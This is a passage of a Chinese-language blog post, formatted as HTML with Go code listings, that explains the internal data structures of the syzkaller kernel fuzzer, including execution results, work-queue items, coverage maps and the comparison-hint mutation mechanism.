class="hljs-comment">// 反馈信号, 若设置了 FlagSignal 则填充</span><br>Cover  []<span class="hljs-type">uint32</span> <span class="hljs-comment">// 每个系统调用的覆盖率, 若设置了 FlagSignal 且 cover == true 则填充,</span><br><span class="hljs-comment">// if dedup == false, 则 cov 实际上包含了一个 trace, 否则重复项被删除</span><br>Comps prog.CompMap <span class="hljs-comment">// 每个系统调用的比较操作数</span><br>Errno <span class="hljs-type">int</span>          <span class="hljs-comment">// 调用的 errno (若调用成功则为 0)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>CompMap</code> 为一个二重映射 <code>uint64 → 【uint64 → bool】</code> ，我们将在后文解释这个东西：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Example: for comparisons &#123;(op1, op2), (op1, op3), (op1, op4), (op2, op1)&#125;</span><br><span class="hljs-comment">// this map will store the following:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//m = &#123;</span><br><span class="hljs-comment">//op1: &#123;map[op2]: true, map[op3]: true, map[op4]: true&#125;,</span><br><span class="hljs-comment">//op2: &#123;map[op1]: true&#125;</span><br><span class="hljs-comment">//&#125;.</span><br><span class="hljs-keyword">type</span> CompMap <span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-type">bool</span><br></code></pre></td></tr></table></figure><h3 id="8-ProgInfo：单个程序的运行结果"><a href="#8-ProgInfo：单个程序的运行结果" class="headerlink" title="8. ProgInfo：单个程序的运行结果"></a>8. ProgInfo：单个程序的运行结果</h3><p>syzkaller 中单次运行的最小粒度其实是由一组系统调用构成的一个程序，因此程序的运行结果很自然地就是由一组 <code>CallInfo</code> 构成：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ProgInfo <span class="hljs-keyword">struct</span> &#123;<br>Calls []CallInfo<br>Extra CallInfo <span class="hljs-comment">// stores Signal and Cover collected from background threads</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-Env：syz-executor-的执行环境信息"><a href="#9-Env：syz-executor-的执行环境信息" class="headerlink" title="9. Env：syz-executor 的执行环境信息"></a>9. Env：syz-executor 的执行环境信息</h3><p> <code>Env</code> 结构体用来记录 syz-executor 的执行环境信息，如输入、输出、执行的命令行等：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br>in  []<span class="hljs-type">byte</span><br>out []<span class="hljs-type">byte</span><br><br>cmd       *command<br>inFile    *os.File<br>outFile   *os.File<br>bin       []<span class="hljs-type">string</span><br>linkedBin <span class="hljs-type">string</span><br>pid       <span class="hljs-type">int</span><br>config    *Config<br><br>StatExecs    <span class="hljs-type">uint64</span><br>StatRestarts <span class="hljs-type">uint64</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="10-WorkTriage-x2F-WorkCandidate-x2F-WorkSmash-：实际的单个输入项"><a href="#10-WorkTriage-x2F-WorkCandidate-x2F-WorkSmash-：实际的单个输入项" class="headerlink" title="10. WorkTriage&#x2F;WorkCandidate&#x2F;WorkSmash ：实际的单个输入项"></a>10. WorkTriage&#x2F;WorkCandidate&#x2F;WorkSmash ：实际的单个输入项</h3><p>在 fuzzing 过程当中 我们实际上不直接以 raw 的 <code>Prog</code> 作为输入，我们还想要在输入上标识更多额外的信息——因此便需要加上一层 wrapper，一共有如下<strong>三种类型</strong>：</p><ul><li><code>WorkTriage</code>：可能提供新的覆盖率的程序</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkTriage 为我们在初次执行时所注意到的潜在新覆盖的程序.</span><br><span class="hljs-comment">// 但我们并不能确定是否这是真实的覆盖率.</span><br><span class="hljs-comment">// 在分类中我们明白了这些程序是否真的给出了新的覆盖率，</span><br><span class="hljs-comment">// 若是，则将其最小化并添加到语料库中.</span><br><span class="hljs-keyword">type</span> WorkTriage <span class="hljs-keyword">struct</span> &#123;<br>p     *prog.Prog<span class="hljs-comment">/* 系统调用序列 */</span><br>call  <span class="hljs-type">int</span><span class="hljs-comment">/* interesting 的系统调用号？ */</span><br>info  ipc.CallInfo<span class="hljs-comment">/* 运行结果 */</span><br>flags ProgTypes<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>WorkCandidate</code>：由 hub（也就是 syz-manager）传来的程序</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkCandidate 为来自 hub 的程序.</span><br><span class="hljs-comment">// 我们暂不知道她们对当前 fuzzer 是否有用.</span><br><span class="hljs-comment">// 进程以对本地生成/变异程序相同的方式处理她们.</span><br><span class="hljs-keyword">type</span> WorkCandidate <span class="hljs-keyword">struct</span> &#123;<br>p     *prog.Prog<span class="hljs-comment">/* 系统调用序列 */</span><br>flags ProgTypes<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>WorkSmash</code>：刚刚被加入到语料库中的程序</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkSmash 为刚刚添加到语料库中的程序.</span><br><span class="hljs-comment">// 在 smashing 过程中这些程序将收到一次特别的关注</span><br><span class="hljs-comment">// (emit faults, collect comparison hints, etc).</span><br><span class="hljs-keyword">type</span> WorkSmash <span class="hljs-keyword">struct</span> &#123;<br>p    *prog.Prog<span class="hljs-comment">/* 系统调用序列 */</span><br>call <span class="hljs-type">int</span><span class="hljs-comment">/* interesting 的系统调用号？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="11-Cover：覆盖率信息"><a href="#11-Cover：覆盖率信息" class="headerlink" title="11. Cover：覆盖率信息"></a>11. Cover：覆盖率信息</h3><p>主流的 fuzzer 都是基于覆盖率指导的，syzkaller 也不例外，在 syz-fuzzer 中使用 <code>Cover</code> 结构体表示覆盖率信息：</p><blockquote><p> 没有注释所以笔者也没太看明白是怎么个意思：( </p><p>目前推测 key 是 program counter，val 目前无实际意义只是用来占位表示覆盖到了该地址</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Cover <span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-keyword">struct</span>&#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="输入生成变异相关"><a href="#输入生成变异相关" class="headerlink" title="输入生成变异相关"></a>输入生成变异相关</h2><h3 id="0-hint-机制"><a href="#0-hint-机制" class="headerlink" title="0. hint 机制"></a>0. hint 机制</h3><p>我们首先来看 syz-executor 中一个重要的变异机制——<code>mutate with hint</code> （可以理解为 hint 辅助的变异），在 <code>hint.go</code> 开头有如下注释：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 一个 hint 大体而言为一个由指向一个程序中一个系统调用的一个参数的指针</span><br><span class="hljs-comment">// 与一个应当被赋给该参数的值（我们称之为 replacer）组成.</span><br><span class="hljs-comment">//（译注：什么B长难句）</span><br><br><span class="hljs-comment">// 一个简易版本的 hints workflow 形如:</span><br><span class="hljs-comment">//1. Fuzzer 启动一个程序 (称之为 hint 种子) 并为程序中的每个系统调用</span><br><span class="hljs-comment">// 收集所有的比较数据.</span><br><span class="hljs-comment">//2. 接下来其尝试将所获得的比较操作数的值于输入参数值进行匹配.</span><br><span class="hljs-comment">//3. 对于每一个这样的匹配，fuzzer 通过将指向的参数使用保存的值进行替换来变异程序.</span><br><span class="hljs-comment">//4. 若获得了一个合法的程序, fuzzer 将其启动并检查是否获得了新的覆盖率.</span><br><span class="hljs-comment">// 要了解更多关于特定突变的信息，参见 prog/hints_test.go.</span><br></code></pre></td></tr></table></figure><h3 id="1-CompMap：用作比较的参数的收缩-x2F-扩展替换取值表【核心】"><a href="#1-CompMap：用作比较的参数的收缩-x2F-扩展替换取值表【核心】" class="headerlink" title="1.CompMap：用作比较的参数的收缩&#x2F;扩展替换取值表【核心】"></a>1.CompMap：用作比较的参数的收缩&#x2F;扩展替换取值表【核心】</h3><p>CompMap 为一个 <code>uint64 </code>到 <code>[uint64 到 bool 的映射]</code> 的映射，用来在<strong>输入变异的时候进行参数值的替换</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 🌰: 对于比较对 &#123;(op1, op2), (op1, op3), (op1, op4), (op2, op1)&#125;</span><br><span class="hljs-comment">// 该映射将存储如下:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//m = &#123;</span><br><span class="hljs-comment">//op1: &#123;map[op2]: true, map[op3]: true, map[op4]: true&#125;,</span><br><span class="hljs-comment">//op2: &#123;map[op1]: true&#125;</span><br><span class="hljs-comment">//&#125;.</span><br><span class="hljs-keyword">type</span> CompMap <span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-type">bool</span><br></code></pre></td></tr></table></figure><p>看着比较抽象，<del>笔者看了半天也不知道这™是个啥玩意</del>，下面我们结合 <code>prog/hints_test.go</code> 中的示例来看：）</p><p><strong>条件分支</strong>是现代编程语言中的一个基本结构，例如我们有如下函数，其会根据不同的取值进入不同的分支：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Models the following code:</span><br><span class="hljs-comment">// void f(u64 qw) &#123;</span><br><span class="hljs-comment">//u8 b = (u8) qw</span><br><span class="hljs-comment">//u16 w = (u16) qw</span><br><span class="hljs-comment">//u32 dw = (u32) qw</span><br><span class="hljs-comment">//if (b == 0xab) &#123;...&#125;</span><br><span class="hljs-comment">//if (w == 0xcdcd) &#123;...&#125;</span><br><span class="hljs-comment">//if (dw == 0xefefefef) &#123;...&#125;</span><br><span class="hljs-comment">//if (qw == 0x0101010101010101) &#123;...&#125;</span><br><span class="hljs-comment">//  &#125;; f(0x1234567890abcdef);</span><br></code></pre></td></tr></table></figure><p>我们给该函数传入的参数为 <code>0x1234567890abcdef</code> 在该函数当中参数由于强制类型转换而发生了<strong>截断</strong>，我们称之为<strong>收缩</strong>（shrink），由于参数截断之后一个条件都匹配不上，所以我们一个分支都进不去：(</p><p>那么如果我们想要走进不同的分支该怎么办呢？ <code>0x1234567890abcdef</code> 截断成 <code>u8</code> 后变成 <code>0xef</code>，如果我们想要走进第一个条件分支那就要替换成 <code>0xab</code>；类似地， <code>0x1234567890abcdef</code> 截断成 <code>u16</code> 后变成 <code>0xcdef</code>，如果我们想要走进第二个条件分支那就要替换成 <code>0xcdcd</code> ； <code>0x1234567890abcdef</code> 截断成 <code>u32</code> 后变成 <code>0xabcdef</code>，如果我们想要走进第三个条件分支那就要替换成 <code>0xefefef</code> ； 而如果我们想要走进最后一个条件分支，则需要将参数整个替换成 <code>0x0101010101010101</code> ，<strong>由此我们得到如下 CompMap</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">CompMap&#123;<br><span class="hljs-number">0xef</span>:               compSet(<span class="hljs-number">0xab</span>, <span class="hljs-number">0xef</span>),<br><span class="hljs-number">0xcdef</span>:             compSet(<span class="hljs-number">0xcdcd</span>),<br><span class="hljs-number">0x90abcdef</span>:         compSet(<span class="hljs-number">0xefefefef</span>),<br><span class="hljs-number">0x1234567890abcdef</span>: compSet(<span class="hljs-number">0x0101010101010101</span>),<br>&#125;,<br></code></pre></td></tr></table></figure><p>根据该 <code>CompMap</code> ，我们最后得到<strong>可以用来替换原参数的新参数值为</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">[]<span class="hljs-type">uint64</span>&#123;<br><span class="hljs-number">0x0101010101010101</span>,<br><span class="hljs-number">0x1234567890abcdab</span>,<br><span class="hljs-number">0x1234567890abcdcd</span>,<br><span class="hljs-number">0x12345678efefefef</span>,<br>&#125;,<br></code></pre></td></tr></table></figure><p>在 syzkaller 的实际运行过程当中，这些比较操作数<strong>对应的是内核中的代码分支</strong>，syzkaller 通过 <code>KCOV</code> 获取这些比较操作数，从而对程序输入变异<strong>以获取更高的代码覆盖率</strong></p><h2 id="全局管控相关"><a href="#全局管控相关" class="headerlink" title="全局管控相关"></a>全局管控相关</h2><h3 id="1-Fuzzer：基本信息"><a href="#1-Fuzzer：基本信息" class="headerlink" title="1. Fuzzer：基本信息"></a>1. Fuzzer：基本信息</h3><p><code>Fuzzer</code> 结构体用以存储一个 syz-fuzzer 的所有基本信息，定义于 <code>syz-fuzzer/fuzzer.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Fuzzer <span class="hljs-keyword">struct</span> &#123;<br>name        <span class="hljs-type">string</span><br>outputType  OutputType<br>config      *ipc.Config<br>execOpts    *ipc.ExecOpts<br>procs       []*Proc<br>gate        *ipc.Gate<br>workQueue   *WorkQueue<br>needPoll    <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>choiceTable *prog.ChoiceTable<br>noMutate    <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span><br><span class="hljs-comment">// stats 域不幸的无法仅是一个 uint64 数组, 因为其在 32 位平台上</span><br><span class="hljs-comment">// 会造成 &quot;unaligned 64-bit atomic operation&quot; 错误</span><br>stats             []<span class="hljs-type">uint64</span><br>manager           *rpctype.RPCClient<br>target            *prog.Target<br>triagedCandidates <span class="hljs-type">uint32</span><br>timeouts          targets.Timeouts<br><br>faultInjectionEnabled    <span class="hljs-type">bool</span><br>comparisonTracingEnabled <span class="hljs-type">bool</span><br>fetchRawCover            <span class="hljs-type">bool</span><br><br>corpusMu     sync.RWMutex<br>corpus       []*prog.Prog<br>corpusHashes <span class="hljs-keyword">map</span>[hash.Sig]<span class="hljs-keyword">struct</span>&#123;&#125;<br>corpusPrios  []<span class="hljs-type">int64</span><br>sumPrios     <span class="hljs-type">int64</span><br><br>signalMu     sync.RWMutex<br>corpusSignal signal.Signal <span class="hljs-comment">// 语料库中的输入的信号</span><br>maxSignal    signal.Signal <span class="hljs-comment">// 包括 flakes 在内的所观察到的最大信号</span><br>newSignal    signal.Signal <span class="hljs-comment">// 自上次与 master 同步以来的 diff of maxSignal</span><br><br>checkResult *rpctype.CheckArgs<br>logMu       sync.Mutex<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-Target：目标架构信息"><a href="#2-Target：目标架构信息" class="headerlink" title="2. Target：目标架构信息"></a>2. Target：目标架构信息</h3><p>定义于 <code>prog/target.go</code> 中的 <code>Target</code> 结构体用以表示 fuzzing 目标架构的基本信息：</p><blockquote><p>懒得翻译了，太多字了，自己看：）</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Target describes target OS/arch pair.</span><br><span class="hljs-keyword">type</span> Target <span class="hljs-keyword">struct</span> &#123;<br>OS                <span class="hljs-type">string</span><br>Arch              <span class="hljs-type">string</span><br>Revision          <span class="hljs-type">string</span> <span class="hljs-comment">// unique hash representing revision of the descriptions</span><br>PtrSize           <span class="hljs-type">uint64</span><br>PageSize          <span class="hljs-type">uint64</span><br>NumPages          <span class="hljs-type">uint64</span><br>DataOffset        <span class="hljs-type">uint64</span><br>LittleEndian      <span class="hljs-type">bool</span><br>ExecutorUsesShmem <span class="hljs-type">bool</span><br><br>Syscalls  []*Syscall<br>Resources []*ResourceDesc<br>Consts    []ConstValue<br><br><span class="hljs-comment">// MakeDataMmap creates calls that mmaps target data memory range.</span><br>MakeDataMmap <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> []*Call<br><br><span class="hljs-comment">// Neutralize neutralizes harmful calls by transforming them into non-harmful ones</span><br><span class="hljs-comment">// (e.g. an ioctl that turns off console output is turned into ioctl that turns on output).</span><br><span class="hljs-comment">// fixStructure determines whether it&#x27;s allowed to make structural changes (e.g. add or</span><br><span class="hljs-comment">// remove arguments). It is helpful e.g. when we do neutralization while iterating over the</span><br><span class="hljs-comment">// arguments.</span><br>Neutralize <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *Call, fixStructure <span class="hljs-type">bool</span>)</span></span> <span class="hljs-type">error</span><br><br><span class="hljs-comment">// AnnotateCall annotates a syscall invocation in C reproducers.</span><br><span class="hljs-comment">// The returned string will be placed inside a comment except for the</span><br><span class="hljs-comment">// empty string which will omit the comment.</span><br>AnnotateCall <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c ExecCall)</span></span> <span class="hljs-type">string</span><br><br><span class="hljs-comment">// SpecialTypes allows target to do custom generation/mutation for some struct&#x27;s and union&#x27;s.</span><br><span class="hljs-comment">// Map key is struct/union name for which custom generation/mutation is required.</span><br><span class="hljs-comment">// Map value is custom generation/mutation function that will be called</span><br><span class="hljs-comment">// for the corresponding type. g is helper object that allows generate random numbers,</span><br><span class="hljs-comment">// allocate memory, etc. typ is the struct/union type. old is the old value of the struct/union</span><br><span class="hljs-comment">// for mutation, or nil for generation. The function returns a new value of the struct/union,</span><br><span class="hljs-comment">// and optionally any calls that need to be inserted before the arg reference.</span><br>SpecialTypes <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(g *Gen, typ Type, dir Dir, old Arg)</span></span> (Arg, []*Call)<br><br><span class="hljs-comment">// Resources that play auxiliary role, but widely used throughout all syscalls (e.g. pid/uid).</span><br>AuxResources <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br><span class="hljs-comment">// Additional special invalid pointer values besides NULL to use.</span><br>SpecialPointers []<span class="hljs-type">uint64</span><br><br><span class="hljs-comment">// Special file name length that can provoke bugs (e.g. PATH_MAX).</span><br>SpecialFileLenghts []<span class="hljs-type">int</span><br><br><span class="hljs-comment">// Filled by prog package:</span><br>SyscallMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*Syscall<br>ConstMap   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span><br><br>init        sync.Once<br>initArch    <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(target *Target)</span></span><br>types       []Type<br>resourceMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*ResourceDesc<br><span class="hljs-comment">// Maps resource name to a list of calls that can create the resource.</span><br>resourceCtors <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>][]*Syscall<br>any           anyTypes<br><br><span class="hljs-comment">// The default ChoiceTable is used only by tests and utilities, so we initialize it lazily.</span><br>defaultOnce        sync.Once<br>defaultChoiceTable *ChoiceTable<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-Proc：syz-executor-实例对象"><a href="#3-Proc：syz-executor-实例对象" class="headerlink" title="3. Proc：syz-executor 实例对象"></a>3. Proc：syz-executor 实例对象</h3><p>在 syz-fuzzer 当中 <code>Proc</code> 结构体被用以表示<strong>一个 syz-executor 实例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Proc 表示一个单独的 fuzzing 程序 (executor).</span><br><span class="hljs-keyword">type</span> Proc <span class="hljs-keyword">struct</span> &#123;<br>fuzzer          *Fuzzer<br>pid             <span class="hljs-type">int</span><br>env             *ipc.Env<br>rnd             *rand.Rand<br>execOpts        *ipc.ExecOpts<br>execOptsCollide *ipc.ExecOpts<br>execOptsCover   *ipc.ExecOpts<br>execOptsComps   *ipc.ExecOpts<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>env</code> 成员用以表示单个 syz-executor 的运行环境，定义于 <code>pkg/ipc/ipc.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br>in  []<span class="hljs-type">byte</span><br>out []<span class="hljs-type">byte</span><br><br>cmd       *command<br>inFile    *os.File<br>outFile   *os.File<br>bin       []<span class="hljs-type">string</span><br>linkedBin <span class="hljs-type">string</span><br>pid       <span class="hljs-type">int</span><br>config    *Config<br><br>StatExecs    <span class="hljs-type">uint64</span><br>StatRestarts <span class="hljs-type">uint64</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Env-&gt;cmd</code> 则用以表示执行 syz-executor 的命令信息，包括 pid、配置、命令行参数等：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> command <span class="hljs-keyword">struct</span> &#123;<br>pid      <span class="hljs-type">int</span><br>config   *Config<br>timeout  time.Duration<br>cmd      *exec.Cmd<br>dir      <span class="hljs-type">string</span><br>readDone <span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span><br>exited   <span class="hljs-keyword">chan</span> <span class="hljs-type">error</span><br>inrp     *os.File<br>outwp    *os.File<br>outmem   []<span class="hljs-type">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>command-&gt;cmd</code> 为最终用来执行 syz-executor 的命令行，来自于 golang 原生的 exec 库</p><h3 id="4-WorkQueue：待使用的单-syz-fuzer-的全局输入队列"><a href="#4-WorkQueue：待使用的单-syz-fuzer-的全局输入队列" class="headerlink" title="4. WorkQueue：待使用的单 syz-fuzer 的全局输入队列"></a>4. WorkQueue：待使用的单 syz-fuzer 的全局输入队列</h3><p>在 syz-fuzzer 当中所有的输入都被存放在 <code>WorkQueue</code> 队列当中，一个 syz-fuzzer 可能会启动多个 syz-executor 进程，他们共享同一个 <code>WorkQueue</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkQueue 存放全局的 non-fuzzing 工作项目 (参见下面的 Work* 结构体).</span><br><span class="hljs-comment">// WorkQueue 也在工作项目间进行优先排序，例如我们想要在我们碎片化程序前</span><br><span class="hljs-comment">// 分类并向 manager 发送新的输入以在 VM 崩溃的情况下不会永久失去有趣的程序.</span><br><span class="hljs-comment">//（译注：interesting input 在 fuzzing 中是经典概念了，这里应该不需要笔者注释了）</span><br><span class="hljs-keyword">type</span> WorkQueue <span class="hljs-keyword">struct</span> &#123;<br>mu              sync.RWMutex<br>triageCandidate []*WorkTriage<br>candidate       []*WorkCandidate<br>triage          []*WorkTriage<br>smash           []*WorkSmash<br><br>procs          <span class="hljs-type">int</span><br>needCandidates <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们可以看到 <code>WorkQueue</code> 为 <code>WorkTriage/WorkCandidate/WorkSmash</code> 都分别建立了一个新的队列 </p><h2 id="fuzzer-amp-executor-通信相关"><a href="#fuzzer-amp-executor-通信相关" class="headerlink" title="fuzzer &amp; executor 通信相关"></a>fuzzer &amp; executor 通信相关</h2><h3 id="1-executeReq：fuzzer→executor-请求头"><a href="#1-executeReq：fuzzer→executor-请求头" class="headerlink" title="1. executeReq：fuzzer→executor 请求头"></a>1. executeReq：fuzzer→executor 请求头</h3><p>fuzzing 的主体进程由 syz-fuzzer 完成，syz-executor 仅需要完成单个输入程序的运行，因此 syz-fuzzer 需要多次与 syz-executor 间通信：发送待运行的数据并接收运行结果</p><p>syz-fuzzer 与 syz-executor 间通信通过管道完成，因此每次通信前 syz-fuzzer 需要手动告诉 syz-executor 本次待接收的数据类型、长度等信息，这些信息被封装在固定大小的 <code>executeReq</code> 结构体当中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 